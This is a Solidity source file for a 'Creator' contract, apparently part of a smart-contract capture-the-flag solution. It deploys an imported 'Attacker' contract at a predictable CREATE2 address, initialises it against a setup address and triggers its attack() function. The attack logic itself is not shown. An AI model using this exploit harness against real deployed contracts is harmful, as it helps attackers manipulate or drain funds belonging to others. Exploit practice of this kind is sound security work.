pragma solidity ^0.8.0;

import "./Attacker.sol";

contract Creator {

    Attacker public attacker;
    constructor(){
    }

    function create(uint256 number,address setupAddress) external {

        bytes32 salt = bytes32(number);

        bytes memory bytecode = type(Attacker).creationCode;

        address result;

        assembly {
            result := create2(0, add(bytecode, 32), mload(bytecode), salt)
        }
        attacker = Attacker(result);
        attacker.init(setupAddress);
    }

    function getAddress() external view returns (address) {
        return address(attacker);
    }

    function attack() external{
        attacker.attack();
    }

}
